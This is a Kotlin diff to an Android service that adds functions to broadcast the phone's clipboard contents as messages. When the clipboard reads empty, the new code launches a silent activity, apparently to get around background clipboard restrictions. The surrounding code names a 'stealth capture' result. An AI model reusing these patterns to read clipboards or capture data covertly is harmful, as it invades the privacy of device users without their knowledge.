@@ -821,6 +821,43 @@ class LocalFileServerService : Service() {
         mqttSendChannel.trySend(msg)
     }
 
+    fun broadcastClipboardData(text: String) {
+        serviceScope.launch(Dispatchers.IO) {
+            broadcastMessage(JSONObject().apply {
+                put("type", "CLIPBOARD_DATA")
+                put("text", text)
+                put("timestamp", System.currentTimeMillis())
+            }.toString())
+        }
+    }
+
+    fun broadcastPhoneCopied(text: String) {
+        val now = System.currentTimeMillis()
+        val hash = text.hashCode().toString()
+        if (hash != lastBroadcastClipHash) {
+            lastBroadcastClipHash = hash
+            serviceScope.launch(Dispatchers.IO) {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CLIPBOARD_COPIED_ON_PHONE")
+                    put("text", text)
+                    put("timestamp", now)
+                }.toString())
+            }
+        }
+    }
+
+    fun launchClipboardSync(isFetch: Boolean = true) {
+        try {
+            val intent = Intent(applicationContext, ClipboardSyncActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_ANIMATION)
+                putExtra("IS_FETCH", isFetch)
+            }
+            startActivity(intent)
+        } catch (e: Exception) {
+            Log.e("LocalFileServerService", "Error launching ClipboardSyncActivity: ${e.message}")
+        }
+    }
+
     private fun sendStealthCaptureResult(target: String, base64Data: String?, error: String?) {
         val response = JSONObject().apply {
             put("type", "STEALTH_CAPTURE_RESULT")
@@ -2536,11 +2573,15 @@ class LocalFileServerService : Service() {
             "FETCH_CLIPBOARD" -> {
                 serviceScope.launch(Dispatchers.IO) {
                     val clipText = teleManager.getClipboardText()
-                    broadcastMessage(JSONObject().apply {
-                        put("type", "CLIPBOARD_DATA")
-                        put("text", clipText)
-                        put("timestamp", System.currentTimeMillis())
-                    }.toString())
+                    if (clipText.isNotBlank()) {
+                        broadcastMessage(JSONObject().apply {
+                            put("type", "CLIPBOARD_DATA")
+                            put("text", clipText)
+                            put("timestamp", System.currentTimeMillis())
+                        }.toString())
+                    } else {
+                        launchClipboardSync(isFetch = true)
+                    }
                 }
             }
 
